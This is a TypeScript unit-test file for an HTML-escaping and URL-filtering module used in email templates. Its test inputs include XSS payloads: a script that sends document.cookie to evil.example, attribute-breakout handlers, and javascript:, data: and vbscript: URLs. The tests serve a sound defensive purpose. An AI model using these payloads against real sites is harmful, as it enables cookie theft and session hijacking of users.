import { SafeHtml, escapeHtml, html, safeUrl } from './safe-html';

// =============================================================================
// safe-html.ts — tests (issue #123, epic #109)
// =============================================================================
//
// These templates interpolate USER-CONTROLLED DATA into a document delivered
// to somebody else's inbox: display names, email addresses, labels. An
// unescaped interpolation here is HTML injection with a real victim on the
// other end, so this file is deliberately more paranoid than a typical unit
// test suite — every interpolation path (`html` tag, arrays, nested
// `SafeHtml`, `null`/`undefined`) is exercised with an actual attack payload,
// not just a benign string.
// =============================================================================

describe('escapeHtml', () => {
  it('escapes the five HTML metacharacters', () => {
    expect(escapeHtml('&')).toBe('&amp;');
    expect(escapeHtml('<')).toBe('&lt;');
    expect(escapeHtml('>')).toBe('&gt;');
    expect(escapeHtml('"')).toBe('&quot;');
    expect(escapeHtml("'")).toBe('&#39;');
  });

  it('escapes & exactly once — does not double-encode into &amp;amp;', () => {
    expect(escapeHtml('Ben & Jerry')).toBe('Ben &amp; Jerry');
    expect(escapeHtml('&')).not.toBe('&amp;amp;');
  });

  it('escapes & before < / >, so an already-escaped entity is not corrupted into a decoded tag', () => {
    // If '<' or '>' were replaced before '&', the '&lt;' this function
    // produces on a first pass would itself get the '&' re-escaped on a
    // (hypothetical) second pass. This pins the single-pass, &-first order
    // directly: pre-existing entity text survives as literal text, and the
    // raw '&' that introduces it is (correctly) escaped too.
    expect(escapeHtml('&lt;script&gt;')).toBe('&amp;lt;script&amp;gt;');
  });

  it('neutralizes a <script> payload', () => {
    const payload = '<script>alert(document.cookie)</script>';
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<script>');
    expect(escaped).not.toContain('</script>');
    expect(escaped).toBe('&lt;script&gt;alert(document.cookie)&lt;/script&gt;');
  });

  // ---------------------------------------------------------------------------
  // Cases beyond the standard escaping pass: astral characters, and a very
  // long value. Both are named explicitly because a naive or subtly-wrong
  // implementation of a character-class replace can mishandle either —
  // splitting a surrogate pair, or silently truncating/short-circuiting on a
  // long input.
  // ---------------------------------------------------------------------------

  describe('astral characters (surrogate pairs) — missed by a plain ASCII-payload pass', () => {
    it('passes an emoji (U+1F600, a surrogate pair) through unescaped and uncorrupted', () => {
      const emoji = '\u{1F600}'; // 😀 — encodes as the surrogate pair 😀
      const payload = `Hi ${emoji} <script>`;
      const escaped = escapeHtml(payload);

      expect(escaped).toBe(`Hi ${emoji} &lt;script&gt;`);
      // The surrogate pair must survive intact — not split into two lone
      // (invalid) surrogates by a regex operating on UTF-16 code units.
      expect(escaped).toContain(emoji);
      expect([...escaped]).toContain(emoji);
    });

    it('does not corrupt a surrogate pair sitting immediately next to an escaped character', () => {
      const emoji = '\u{1F600}';
      // The emoji's low surrogate is adjacent to the '<' being escaped, which
      // is exactly the position where an off-by-one in a code-unit-based
      // scan would slice through the pair.
      const input = `${emoji}<`;
      expect(escapeHtml(input)).toBe(`${emoji}&lt;`);
    });

    it('handles a ZWJ emoji sequence (multiple code points forming one glyph) without dropping parts of it', () => {
      const family = '\u{1F468}‍\u{1F469}‍\u{1F467}'; // family emoji: man + ZWJ + woman + ZWJ + girl
      const escaped = escapeHtml(`${family}<b>`);
      expect(escaped).toBe(`${family}&lt;b&gt;`);
    });
  });

  describe('a very long value — missed by a short-payload pass', () => {
    it('escapes every occurrence across a 200k-character string, not just a prefix', () => {
      const long =
        '<script>' +
        'A'.repeat(100_000) +
        '<script>' +
        'B'.repeat(100_000) +
        '</script>';
      const escaped = escapeHtml(long);

      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('</script>');
      expect(escaped.match(/&lt;script&gt;/g)).toHaveLength(2);
      expect(escaped.match(/&lt;\/script&gt;/g)).toHaveLength(1);
      // Escaping strictly grows the string: each '<' or '>' (1 char) becomes
      // an entity (4 chars), a net +3 per occurrence. There are 3 '<' and 3
      // '>' across the three tag occurrences, so +18 overall. A truncating
      // or short-circuiting bug (only escaping a prefix, or capping output
      // length) would make this fail.
      const angleBracketCount = (long.match(/[<>]/g) ?? []).length;
      expect(escaped.length).toBe(long.length + angleBracketCount * 3);
    });

    it('does not throw or hang on a large input (no catastrophic backtracking)', () => {
      const huge = '<>&"\''.repeat(200_000); // 1M characters, all five metacharacters
      const start = Date.now();
      const escaped = escapeHtml(huge);
      expect(Date.now() - start).toBeLessThan(2000);
      // No RAW metacharacter survives escaping...
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
      expect(escaped).not.toContain('"');
      expect(escaped).not.toContain("'");
      // ...but '&' legitimately appears many times, as the first character
      // of every entity produced above.
      expect(escaped.match(/&/g)?.length).toBe(1_000_000);
    });
  });
});

describe('SafeHtml', () => {
  it('EMPTY renders as the empty string', () => {
    expect(SafeHtml.EMPTY.toString()).toBe('');
  });

  it('unsafeFromTrustedString emits its argument verbatim, with no escaping', () => {
    const trusted = '<b>literal, source-controlled markup</b>';
    expect(SafeHtml.unsafeFromTrustedString(trusted).toString()).toBe(trusted);
  });
});

describe('html tag (escaping on interpolation)', () => {
  it('escapes a plain string interpolation', () => {
    const out = html`<p>${'plain text'}</p>`;
    expect(out.toString()).toBe('<p>plain text</p>');
  });

  it('a <script> payload interpolated into element content comes out inert', () => {
    const payload = '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
    const out = html`<p>Hello, ${payload}</p>`;
    const rendered = out.toString();

    expect(rendered).not.toContain('<script>');
    expect(rendered).not.toContain('</script>');
    expect(rendered).toContain('&lt;script&gt;');
  });

  it('a double-quote attribute breakout is escaped, not left able to close the attribute', () => {
    const payload = '" onmouseover="alert(document.cookie)';
    const out = html`<div data-x="${payload}"></div>`;
    const rendered = out.toString();

    // Exact expected output: quote escaped, structure of the tag preserved,
    // single attribute, no new attribute introduced.
    expect(rendered).toBe(
      '<div data-x="&quot; onmouseover=&quot;alert(document.cookie)"></div>',
    );
    expect(rendered).not.toMatch(/"\s*onmouseover=/);
  });

  it('a single-quote attribute breakout is escaped, not left able to close the attribute', () => {
    const payload = "' onmouseover='alert(document.cookie)";
    const out = html`<div data-x='${payload}'></div>`;
    const rendered = out.toString();

    expect(rendered).toBe(
      "<div data-x='&#39; onmouseover=&#39;alert(document.cookie)'></div>",
    );
    expect(rendered).not.toMatch(/'\s*onmouseover=/);
  });

  it('escapes & exactly once inside a template, not double-encoded into &amp;amp;', () => {
    const out = html`<p>${'Terms & Conditions'}</p>`;
    expect(out.toString()).toBe('<p>Terms &amp; Conditions</p>');
    expect(out.toString()).not.toContain('&amp;amp;');
  });

  it('interpolates a nested SafeHtml fragment verbatim, without double-escaping it', () => {
    const inner = html`<strong>bold</strong>`;
    const outer = html`<p>${inner}</p>`;

    expect(outer.toString()).toBe('<p><strong>bold</strong></p>');
    expect(outer.toString()).not.toContain('&lt;strong&gt;');
  });

  it('composes a conditional block: a SafeHtml fragment or SafeHtml.EMPTY, never a raw string branch', () => {
    const withBlock = (show: boolean) =>
      html`<div>${show ? html`<em>shown</em>` : SafeHtml.EMPTY}</div>`;

    expect(withBlock(true).toString()).toBe('<div><em>shown</em></div>');
    expect(withBlock(false).toString()).toBe('<div></div>');
  });

  it('escapes every element of an interpolated array', () => {
    const rows = ['<a>', '<b onload=x>', 'plain'];
    const out = html`X${rows}Y`;
    expect(out.toString()).toBe('X&lt;a&gt;&lt;b onload=x&gt;plainY');
  });

  it('interpolates an array of nested SafeHtml fragments verbatim (the table-row composition pattern)', () => {
    const rows = ['one', 'two'].map((label) => html`<tr><td>${label}</td></tr>`);
    const out = html`<table>${rows}</table>`;
    expect(out.toString()).toBe(
      '<table><tr><td>one</td></tr><tr><td>two</td></tr></table>',
    );
  });

  it('renders null as empty, not the literal string "null"', () => {
    expect(html`a${null}b`.toString()).toBe('ab');
  });

  it('renders undefined as empty, not the literal string "undefined"', () => {
    expect(html`a${undefined}b`.toString()).toBe('ab');
  });

  it('renders null/undefined mixed with real values in a single template', () => {
    const out = html`<p>${'Hello, '}${undefined}${null}${'World'}</p>`;
    expect(out.toString()).toBe('<p>Hello, World</p>');
  });

  it('coerces and escapes a non-string primitive (number)', () => {
    expect(html`count: ${42}`.toString()).toBe('count: 42');
  });

  describe('backtick / ${} sequences in data — missed by a plain <script>-only pass', () => {
    it('a value containing backticks and ${} template-injection-looking text renders as inert literal text', () => {
      // This cannot actually re-enter the template-literal parser (that
      // happens at compile time, not at runtime), but it pins the property:
      // renderValue treats this as opaque data, escaping only the HTML
      // metacharacters it contains, and does not strip or reinterpret it.
      const payload = 'name`; ${process.env.SECRET_KEY} //<script>x</script>';
      const out = html`<p>${payload}</p>`;
      const rendered = out.toString();

      expect(rendered).toContain('`');
      expect(rendered).toContain('${process.env.SECRET_KEY}');
      expect(rendered).not.toContain('<script>');
      expect(rendered).toBe(`<p>${escapeHtml(payload)}</p>`);
    });
  });
});

describe('safeUrl', () => {
  it('allows http', () => {
    expect(safeUrl('http://example.com')).toBe('http://example.com');
  });

  it('allows https, including path and query', () => {
    const url = 'https://example.com/settings?ref=email';
    expect(safeUrl(url)).toBe(url);
  });

  it('allows mailto', () => {
    const url = 'mailto:test@example.com';
    expect(safeUrl(url)).toBe(url);
  });

  it('rejects javascript: URLs', () => {
    expect(safeUrl('javascript:alert(document.cookie)')).toBeNull();
  });

  it('rejects a case-variant javascript: scheme (JaVaScRiPt:)', () => {
    expect(safeUrl('JaVaScRiPt:alert(document.cookie)')).toBeNull();
  });

  it('rejects data: URLs', () => {
    expect(safeUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
  });

  it('rejects a case-variant data: scheme', () => {
    expect(safeUrl('DaTa:text/html,evil')).toBeNull();
  });

  it('rejects vbscript: URLs', () => {
    expect(safeUrl('vbscript:msgbox(1)')).toBeNull();
  });

  it('rejects a root-relative URL — an email has no document base to resolve against', () => {
    expect(safeUrl('/settings')).toBeNull();
  });

  it('rejects a bare relative path', () => {
    expect(safeUrl('settings/email')).toBeNull();
  });

  it('rejects a protocol-relative URL', () => {
    expect(safeUrl('//evil.example.com/phish')).toBeNull();
  });

  it('rejects an empty string', () => {
    expect(safeUrl('')).toBeNull();
  });

  it('rejects an unparseable string', () => {
    expect(safeUrl('not a url at all')).toBeNull();
  });
});
